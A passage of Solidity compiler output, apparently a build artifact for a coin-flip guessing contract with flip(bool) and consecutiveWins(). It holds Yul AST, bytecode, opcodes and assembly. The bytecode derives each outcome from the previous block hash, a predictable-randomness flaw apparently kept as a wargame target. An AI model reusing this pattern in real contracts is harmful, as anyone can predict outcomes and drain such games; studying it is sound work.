																	"nodeType": "YulIdentifier",
																	"src": "2066:17:2"
																},
																"nativeSrc": "2066:20:2",
																"nodeType": "YulFunctionCall",
																"src": "2066:20:2"
															},
															"variableNames": [
																{
																	"name": "y",
																	"nativeSrc": "2061:1:2",
																	"nodeType": "YulIdentifier",
																	"src": "2061:1:2"
																}
															]
														},
														{
															"nativeSrc": "2095:17:2",
															"nodeType": "YulAssignment",
															"src": "2095:17:2",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nativeSrc": "2107:1:2",
																		"nodeType": "YulIdentifier",
																		"src": "2107:1:2"
																	},
																	{
																		"name": "y",
																		"nativeSrc": "2110:1:2",
																		"nodeType": "YulIdentifier",
																		"src": "2110:1:2"
																	}
																],
																"functionName": {
																	"name": "sub",
																	"nativeSrc": "2103:3:2",
																	"nodeType": "YulIdentifier",
																	"src": "2103:3:2"
																},
																"nativeSrc": "2103:9:2",
																"nodeType": "YulFunctionCall",
																"src": "2103:9:2"
															},
															"variableNames": [
																{
																	"name": "diff",
																	"nativeSrc": "2095:4:2",
																	"nodeType": "YulIdentifier",
																	"src": "2095:4:2"
																}
															]
														},
														{
															"body": {
																"nativeSrc": "2137:22:2",
																"nodeType": "YulBlock",
																"src": "2137:22:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "panic_error_0x11",
																				"nativeSrc": "2139:16:2",
																				"nodeType": "YulIdentifier",
																				"src": "2139:16:2"
																			},
																			"nativeSrc": "2139:18:2",
																			"nodeType": "YulFunctionCall",
																			"src": "2139:18:2"
																		},
																		"nativeSrc": "2139:18:2",
																		"nodeType": "YulExpressionStatement",
																		"src": "2139:18:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "diff",
																		"nativeSrc": "2128:4:2",
																		"nodeType": "YulIdentifier",
																		"src": "2128:4:2"
																	},
																	{
																		"name": "x",
																		"nativeSrc": "2134:1:2",
																		"nodeType": "YulIdentifier",
																		"src": "2134:1:2"
																	}
																],
																"functionName": {
																	"name": "gt",
																	"nativeSrc": "2125:2:2",
																	"nodeType": "YulIdentifier",
																	"src": "2125:2:2"
																},
																"nativeSrc": "2125:11:2",
																"nodeType": "YulFunctionCall",
																"src": "2125:11:2"
															},
															"nativeSrc": "2122:37:2",
															"nodeType": "YulIf",
															"src": "2122:37:2"
														}
													]
												},
												"name": "checked_sub_t_uint256",
												"nativeSrc": "1972:194:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "x",
														"nativeSrc": "2003:1:2",
														"nodeType": "YulTypedName",
														"src": "2003:1:2",
														"type": ""
													},
													{
														"name": "y",
														"nativeSrc": "2006:1:2",
														"nodeType": "YulTypedName",
														"src": "2006:1:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "diff",
														"nativeSrc": "2012:4:2",
														"nodeType": "YulTypedName",
														"src": "2012:4:2",
														"type": ""
													}
												],
												"src": "1972:194:2"
											},
											{
												"body": {
													"nativeSrc": "2200:152:2",
													"nodeType": "YulBlock",
													"src": "2200:152:2",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nativeSrc": "2217:1:2",
																		"nodeType": "YulLiteral",
																		"src": "2217:1:2",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "2220:77:2",
																		"nodeType": "YulLiteral",
																		"src": "2220:77:2",
																		"type": "",
																		"value": "35408467139433450592217433187231851964531694900788300625387963629091585785856"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nativeSrc": "2210:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "2210:6:2"
																},
																"nativeSrc": "2210:88:2",
																"nodeType": "YulFunctionCall",
																"src": "2210:88:2"
															},
															"nativeSrc": "2210:88:2",
															"nodeType": "YulExpressionStatement",
															"src": "2210:88:2"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nativeSrc": "2314:1:2",
																		"nodeType": "YulLiteral",
																		"src": "2314:1:2",
																		"type": "",
																		"value": "4"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "2317:4:2",
																		"nodeType": "YulLiteral",
																		"src": "2317:4:2",
																		"type": "",
																		"value": "0x12"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nativeSrc": "2307:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "2307:6:2"
																},
																"nativeSrc": "2307:15:2",
																"nodeType": "YulFunctionCall",
																"src": "2307:15:2"
															},
															"nativeSrc": "2307:15:2",
															"nodeType": "YulExpressionStatement",
															"src": "2307:15:2"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nativeSrc": "2338:1:2",
																		"nodeType": "YulLiteral",
																		"src": "2338:1:2",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "2341:4:2",
																		"nodeType": "YulLiteral",
																		"src": "2341:4:2",
																		"type": "",
																		"value": "0x24"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nativeSrc": "2331:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "2331:6:2"
																},
																"nativeSrc": "2331:15:2",
																"nodeType": "YulFunctionCall",
																"src": "2331:15:2"
															},
															"nativeSrc": "2331:15:2",
															"nodeType": "YulExpressionStatement",
															"src": "2331:15:2"
														}
													]
												},
												"name": "panic_error_0x12",
												"nativeSrc": "2172:180:2",
												"nodeType": "YulFunctionDefinition",
												"src": "2172:180:2"
											},
											{
												"body": {
													"nativeSrc": "2400:143:2",
													"nodeType": "YulBlock",
													"src": "2400:143:2",
													"statements": [
														{
															"nativeSrc": "2410:25:2",
															"nodeType": "YulAssignment",
															"src": "2410:25:2",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nativeSrc": "2433:1:2",
																		"nodeType": "YulIdentifier",
																		"src": "2433:1:2"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nativeSrc": "2415:17:2",
																	"nodeType": "YulIdentifier",
																	"src": "2415:17:2"
																},
																"nativeSrc": "2415:20:2",
																"nodeType": "YulFunctionCall",
																"src": "2415:20:2"
															},
															"variableNames": [
																{
																	"name": "x",
																	"nativeSrc": "2410:1:2",
																	"nodeType": "YulIdentifier",
																	"src": "2410:1:2"
																}
															]
														},
														{
															"nativeSrc": "2444:25:2",
															"nodeType": "YulAssignment",
															"src": "2444:25:2",
															"value": {
																"arguments": [
																	{
																		"name": "y",
																		"nativeSrc": "2467:1:2",
																		"nodeType": "YulIdentifier",
																		"src": "2467:1:2"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nativeSrc": "2449:17:2",
																	"nodeType": "YulIdentifier",
																	"src": "2449:17:2"
																},
																"nativeSrc": "2449:20:2",
																"nodeType": "YulFunctionCall",
																"src": "2449:20:2"
															},
															"variableNames": [
																{
																	"name": "y",
																	"nativeSrc": "2444:1:2",
																	"nodeType": "YulIdentifier",
																	"src": "2444:1:2"
																}
															]
														},
														{
															"body": {
																"nativeSrc": "2491:22:2",
																"nodeType": "YulBlock",
																"src": "2491:22:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "panic_error_0x12",
																				"nativeSrc": "2493:16:2",
																				"nodeType": "YulIdentifier",
																				"src": "2493:16:2"
																			},
																			"nativeSrc": "2493:18:2",
																			"nodeType": "YulFunctionCall",
																			"src": "2493:18:2"
																		},
																		"nativeSrc": "2493:18:2",
																		"nodeType": "YulExpressionStatement",
																		"src": "2493:18:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "y",
																		"nativeSrc": "2488:1:2",
																		"nodeType": "YulIdentifier",
																		"src": "2488:1:2"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nativeSrc": "2481:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "2481:6:2"
																},
																"nativeSrc": "2481:9:2",
																"nodeType": "YulFunctionCall",
																"src": "2481:9:2"
															},
															"nativeSrc": "2478:35:2",
															"nodeType": "YulIf",
															"src": "2478:35:2"
														},
														{
															"nativeSrc": "2523:14:2",
															"nodeType": "YulAssignment",
															"src": "2523:14:2",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nativeSrc": "2532:1:2",
																		"nodeType": "YulIdentifier",
																		"src": "2532:1:2"
																	},
																	{
																		"name": "y",
																		"nativeSrc": "2535:1:2",
																		"nodeType": "YulIdentifier",
																		"src": "2535:1:2"
																	}
																],
																"functionName": {
																	"name": "div",
																	"nativeSrc": "2528:3:2",
																	"nodeType": "YulIdentifier",
																	"src": "2528:3:2"
																},
																"nativeSrc": "2528:9:2",
																"nodeType": "YulFunctionCall",
																"src": "2528:9:2"
															},
															"variableNames": [
																{
																	"name": "r",
																	"nativeSrc": "2523:1:2",
																	"nodeType": "YulIdentifier",
																	"src": "2523:1:2"
																}
															]
														}
													]
												},
												"name": "checked_div_t_uint256",
												"nativeSrc": "2358:185:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "x",
														"nativeSrc": "2389:1:2",
														"nodeType": "YulTypedName",
														"src": "2389:1:2",
														"type": ""
													},
													{
														"name": "y",
														"nativeSrc": "2392:1:2",
														"nodeType": "YulTypedName",
														"src": "2392:1:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "r",
														"nativeSrc": "2398:1:2",
														"nodeType": "YulTypedName",
														"src": "2398:1:2",
														"type": ""
													}
												],
												"src": "2358:185:2"
											},
											{
												"body": {
													"nativeSrc": "2592:190:2",
													"nodeType": "YulBlock",
													"src": "2592:190:2",
													"statements": [
														{
															"nativeSrc": "2602:33:2",
															"nodeType": "YulAssignment",
															"src": "2602:33:2",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nativeSrc": "2629:5:2",
																		"nodeType": "YulIdentifier",
																		"src": "2629:5:2"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nativeSrc": "2611:17:2",
																	"nodeType": "YulIdentifier",
																	"src": "2611:17:2"
																},
																"nativeSrc": "2611:24:2",
																"nodeType": "YulFunctionCall",
																"src": "2611:24:2"
															},
															"variableNames": [
																{
																	"name": "value",
																	"nativeSrc": "2602:5:2",
																	"nodeType": "YulIdentifier",
																	"src": "2602:5:2"
																}
															]
														},
														{
															"body": {
																"nativeSrc": "2725:22:2",
																"nodeType": "YulBlock",
																"src": "2725:22:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "panic_error_0x11",
																				"nativeSrc": "2727:16:2",
																				"nodeType": "YulIdentifier",
																				"src": "2727:16:2"
																			},
																			"nativeSrc": "2727:18:2",
																			"nodeType": "YulFunctionCall",
																			"src": "2727:18:2"
																		},
																		"nativeSrc": "2727:18:2",
																		"nodeType": "YulExpressionStatement",
																		"src": "2727:18:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "value",
																		"nativeSrc": "2650:5:2",
																		"nodeType": "YulIdentifier",
																		"src": "2650:5:2"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "2657:66:2",
																		"nodeType": "YulLiteral",
																		"src": "2657:66:2",
																		"type": "",
																		"value": "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
																	}
																],
																"functionName": {
																	"name": "eq",
																	"nativeSrc": "2647:2:2",
																	"nodeType": "YulIdentifier",
																	"src": "2647:2:2"
																},
																"nativeSrc": "2647:77:2",
																"nodeType": "YulFunctionCall",
																"src": "2647:77:2"
															},
															"nativeSrc": "2644:103:2",
															"nodeType": "YulIf",
															"src": "2644:103:2"
														},
														{
															"nativeSrc": "2756:20:2",
															"nodeType": "YulAssignment",
															"src": "2756:20:2",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nativeSrc": "2767:5:2",
																		"nodeType": "YulIdentifier",
																		"src": "2767:5:2"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "2774:1:2",
																		"nodeType": "YulLiteral",
																		"src": "2774:1:2",
																		"type": "",
																		"value": "1"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nativeSrc": "2763:3:2",
																	"nodeType": "YulIdentifier",
																	"src": "2763:3:2"
																},
																"nativeSrc": "2763:13:2",
																"nodeType": "YulFunctionCall",
																"src": "2763:13:2"
															},
															"variableNames": [
																{
																	"name": "ret",
																	"nativeSrc": "2756:3:2",
																	"nodeType": "YulIdentifier",
																	"src": "2756:3:2"
																}
															]
														}
													]
												},
												"name": "increment_t_uint256",
												"nativeSrc": "2549:233:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "2578:5:2",
														"nodeType": "YulTypedName",
														"src": "2578:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "ret",
														"nativeSrc": "2588:3:2",
														"nodeType": "YulTypedName",
														"src": "2588:3:2",
														"type": ""
													}
												],
												"src": "2549:233:2"
											}
										]
									},
									"contents": "{\n\n    function allocate_unbounded() -> memPtr {\n        memPtr := mload(64)\n    }\n\n    function revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() {\n        revert(0, 0)\n    }\n\n    function revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db() {\n        revert(0, 0)\n    }\n\n    function cleanup_t_bool(value) -> cleaned {\n        cleaned := iszero(iszero(value))\n    }\n\n    function validator_revert_t_bool(value) {\n        if iszero(eq(value, cleanup_t_bool(value))) { revert(0, 0) }\n    }\n\n    function abi_decode_t_bool(offset, end) -> value {\n        value := calldataload(offset)\n        validator_revert_t_bool(value)\n    }\n\n    function abi_decode_tuple_t_bool(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_bool(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function abi_encode_t_bool_to_t_bool_fromStack(value, pos) {\n        mstore(pos, cleanup_t_bool(value))\n    }\n\n    function abi_encode_tuple_t_bool__to_t_bool__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_bool_to_t_bool_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function cleanup_t_uint256(value) -> cleaned {\n        cleaned := value\n    }\n\n    function abi_encode_t_uint256_to_t_uint256_fromStack(value, pos) {\n        mstore(pos, cleanup_t_uint256(value))\n    }\n\n    function abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_uint256_to_t_uint256_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function panic_error_0x11() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x11)\n        revert(0, 0x24)\n    }\n\n    function checked_sub_t_uint256(x, y) -> diff {\n        x := cleanup_t_uint256(x)\n        y := cleanup_t_uint256(y)\n        diff := sub(x, y)\n\n        if gt(diff, x) { panic_error_0x11() }\n\n    }\n\n    function panic_error_0x12() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x12)\n        revert(0, 0x24)\n    }\n\n    function checked_div_t_uint256(x, y) -> r {\n        x := cleanup_t_uint256(x)\n        y := cleanup_t_uint256(y)\n        if iszero(y) { panic_error_0x12() }\n\n        r := div(x, y)\n    }\n\n    function increment_t_uint256(value) -> ret {\n        value := cleanup_t_uint256(value)\n        if eq(value, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) { panic_error_0x11() }\n        ret := add(value, 1)\n    }\n\n}\n",
									"id": 2,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "608060405234801561000f575f5ffd5b5060043610610034575f3560e01c80631d263f6714610038578063e6f334d714610068575b5f5ffd5b610052600480360381019061004d9190610150565b610086565b60405161005f919061018a565b60405180910390f35b610070610112565b60405161007d91906101bb565b60405180910390f35b5f5f6001436100959190610201565b405f1c905080600154036100a7575f5ffd5b806001819055505f600254826100bd9190610261565b90505f600182146100ce575f6100d1565b60015b905084151581151503610100575f5f8154809291906100ef90610291565b91905055506001935050505061010d565b5f5f819055505f93505050505b919050565b5f5481565b5f5ffd5b5f8115159050919050565b61012f8161011b565b8114610139575f5ffd5b50565b5f8135905061014a81610126565b92915050565b5f6020828403121561016557610164610117565b5b5f6101728482850161013c565b91505092915050565b6101848161011b565b82525050565b5f60208201905061019d5f83018461017b565b92915050565b5f819050919050565b6101b5816101a3565b82525050565b5f6020820190506101ce5f8301846101ac565b92915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f61020b826101a3565b9150610216836101a3565b925082820390508181111561022e5761022d6101d4565b5b92915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601260045260245ffd5b5f61026b826101a3565b9150610276836101a3565b92508261028657610285610234565b5b828204905092915050565b5f61029b826101a3565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff82036102cd576102cc6101d4565b5b60018201905091905056fea2646970667358221220600c01c94b94dccd9b2d13cb809818dbacf42bbd2b43e8676a47093f835e081e64736f6c634300081b0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x34 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x1D263F67 EQ PUSH2 0x38 JUMPI DUP1 PUSH4 0xE6F334D7 EQ PUSH2 0x68 JUMPI JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH2 0x52 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x4D SWAP2 SWAP1 PUSH2 0x150 JUMP JUMPDEST PUSH2 0x86 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x5F SWAP2 SWAP1 PUSH2 0x18A JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x70 PUSH2 0x112 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x7D SWAP2 SWAP1 PUSH2 0x1BB JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH0 PUSH0 PUSH1 0x1 NUMBER PUSH2 0x95 SWAP2 SWAP1 PUSH2 0x201 JUMP JUMPDEST BLOCKHASH PUSH0 SHR SWAP1 POP DUP1 PUSH1 0x1 SLOAD SUB PUSH2 0xA7 JUMPI PUSH0 PUSH0 REVERT JUMPDEST DUP1 PUSH1 0x1 DUP2 SWAP1 SSTORE POP PUSH0 PUSH1 0x2 SLOAD DUP3 PUSH2 0xBD SWAP2 SWAP1 PUSH2 0x261 JUMP JUMPDEST SWAP1 POP PUSH0 PUSH1 0x1 DUP3 EQ PUSH2 0xCE JUMPI PUSH0 PUSH2 0xD1 JUMP JUMPDEST PUSH1 0x1 JUMPDEST SWAP1 POP DUP5 ISZERO ISZERO DUP2 ISZERO ISZERO SUB PUSH2 0x100 JUMPI PUSH0 PUSH0 DUP2 SLOAD DUP1 SWAP3 SWAP2 SWAP1 PUSH2 0xEF SWAP1 PUSH2 0x291 JUMP JUMPDEST SWAP2 SWAP1 POP SSTORE POP PUSH1 0x1 SWAP4 POP POP POP POP PUSH2 0x10D JUMP JUMPDEST PUSH0 PUSH0 DUP2 SWAP1 SSTORE POP PUSH0 SWAP4 POP POP POP POP JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 SLOAD DUP2 JUMP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x12F DUP2 PUSH2 0x11B JUMP JUMPDEST DUP2 EQ PUSH2 0x139 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x14A DUP2 PUSH2 0x126 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x165 JUMPI PUSH2 0x164 PUSH2 0x117 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x172 DUP5 DUP3 DUP6 ADD PUSH2 0x13C JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x184 DUP2 PUSH2 0x11B JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x19D PUSH0 DUP4 ADD DUP5 PUSH2 0x17B JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x1B5 DUP2 PUSH2 0x1A3 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x1CE PUSH0 DUP4 ADD DUP5 PUSH2 0x1AC JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH2 0x20B DUP3 PUSH2 0x1A3 JUMP JUMPDEST SWAP2 POP PUSH2 0x216 DUP4 PUSH2 0x1A3 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 SUB SWAP1 POP DUP2 DUP2 GT ISZERO PUSH2 0x22E JUMPI PUSH2 0x22D PUSH2 0x1D4 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH2 0x26B DUP3 PUSH2 0x1A3 JUMP JUMPDEST SWAP2 POP PUSH2 0x276 DUP4 PUSH2 0x1A3 JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0x286 JUMPI PUSH2 0x285 PUSH2 0x234 JUMP JUMPDEST JUMPDEST DUP3 DUP3 DIV SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0x29B DUP3 PUSH2 0x1A3 JUMP JUMPDEST SWAP2 POP PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 SUB PUSH2 0x2CD JUMPI PUSH2 0x2CC PUSH2 0x1D4 JUMP JUMPDEST JUMPDEST PUSH1 0x1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH1 0xC ADD 0xC9 0x4B SWAP5 0xDC 0xCD SWAP12 0x2D SGT 0xCB DUP1 SWAP9 XOR 0xDB 0xAC DELEGATECALL 0x2B 0xBD 0x2B NUMBER 0xE8 PUSH8 0x6A47093F835E081E PUSH5 0x736F6C6343 STOP ADDMOD SHL STOP CALLER ",
							"sourceMap": "58:738:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;297:497;;;;;;;;;;;;;:::i;:::-;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;82:30;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;297:497;340:4;356:18;410:1;395:12;:16;;;;:::i;:::-;385:27;377:36;;356:57;;440:10;428:8;;:22;424:61;;466:8;;;424:61;506:10;495:8;:21;;;;526:16;558:6;;545:10;:19;;;;:::i;:::-;526:38;;574:9;598:1;586:8;:13;:28;;609:5;586:28;;;602:4;586:28;574:40;;637:6;629:14;;:4;:14;;;625:163;;659:15;;:17;;;;;;;;;:::i;:::-;;;;;;697:4;690:11;;;;;;;625:163;750:1;732:15;:19;;;;772:5;765:12;;;;;297:497;;;;:::o;82:30::-;;;;:::o;88:117:2:-;197:1;194;187:12;334:90;368:7;411:5;404:13;397:21;386:32;;334:90;;;:::o;430:116::-;500:21;515:5;500:21;:::i;:::-;493:5;490:32;480:60;;536:1;533;526:12;480:60;430:116;:::o;552:133::-;595:5;633:6;620:20;611:29;;649:30;673:5;649:30;:::i;:::-;552:133;;;;:::o;691:323::-;747:6;796:2;784:9;775:7;771:23;767:32;764:119;;;802:79;;:::i;:::-;764:119;922:1;947:50;989:7;980:6;969:9;965:22;947:50;:::i;:::-;937:60;;893:114;691:323;;;;:::o;1020:109::-;1101:21;1116:5;1101:21;:::i;:::-;1096:3;1089:34;1020:109;;:::o;1135:210::-;1222:4;1260:2;1249:9;1245:18;1237:26;;1273:65;1335:1;1324:9;1320:17;1311:6;1273:65;:::i;:::-;1135:210;;;;:::o;1351:77::-;1388:7;1417:5;1406:16;;1351:77;;;:::o;1434:118::-;1521:24;1539:5;1521:24;:::i;:::-;1516:3;1509:37;1434:118;;:::o;1558:222::-;1651:4;1689:2;1678:9;1674:18;1666:26;;1702:71;1770:1;1759:9;1755:17;1746:6;1702:71;:::i;:::-;1558:222;;;;:::o;1786:180::-;1834:77;1831:1;1824:88;1931:4;1928:1;1921:15;1955:4;1952:1;1945:15;1972:194;2012:4;2032:20;2050:1;2032:20;:::i;:::-;2027:25;;2066:20;2084:1;2066:20;:::i;:::-;2061:25;;2110:1;2107;2103:9;2095:17;;2134:1;2128:4;2125:11;2122:37;;;2139:18;;:::i;:::-;2122:37;1972:194;;;;:::o;2172:180::-;2220:77;2217:1;2210:88;2317:4;2314:1;2307:15;2341:4;2338:1;2331:15;2358:185;2398:1;2415:20;2433:1;2415:20;:::i;:::-;2410:25;;2449:20;2467:1;2449:20;:::i;:::-;2444:25;;2488:1;2478:35;;2493:18;;:::i;:::-;2478:35;2535:1;2532;2528:9;2523:14;;2358:185;;;;:::o;2549:233::-;2588:3;2611:24;2629:5;2611:24;:::i;:::-;2602:33;;2657:66;2650:5;2647:77;2644:103;;2727:18;;:::i;:::-;2644:103;2774:1;2767:5;2763:13;2756:20;;2549:233;;;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "156400",
								"executionCost": "27318",
								"totalCost": "183718"
							},
							"external": {
								"consecutiveWins()": "2424",
								"flip(bool)": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 58,
									"end": 796,
									"name": "PUSH",
									"source": 0,
									"value": "80"
								},
								{
									"begin": 58,
									"end": 796,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 58,
									"end": 796,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 157,
									"end": 234,
									"name": "PUSH",
									"source": 0,
									"value": "8000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 140,
									"end": 234,
									"name": "PUSH",
									"source": 0,
									"value": "2"
								},
								{
									"begin": 140,
									"end": 234,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 241,
									"end": 291,
									"name": "CALLVALUE",
									"source": 0
								},
								{
									"begin": 241,
									"end": 291,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 241,
									"end": 291,
									"name": "ISZERO",
									"source": 0
								},
								{
									"begin": 241,
									"end": 291,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 241,
									"end": 291,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 241,
									"end": 291,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 241,
									"end": 291,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 241,
									"end": 291,
									"name": "REVERT",
									"source": 0
								},
								{
									"begin": 241,
									"end": 291,
									"name": "tag",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 241,
									"end": 291,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 241,
									"end": 291,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 283,
									"end": 284,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 265,
									"end": 280,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 265,
									"end": 284,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 265,
									"end": 284,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 265,
									"end": 284,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 265,
									"end": 284,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 58,
									"end": 796,
									"name": "PUSH #[$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 58,
									"end": 796,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 58,
									"end": 796,
									"name": "PUSH [$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 58,
									"end": 796,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 58,
									"end": 796,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 58,
									"end": 796,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 58,
									"end": 796,
									"name": "RETURN",
									"source": 0
								}
							],
							".data": {
								"0": {
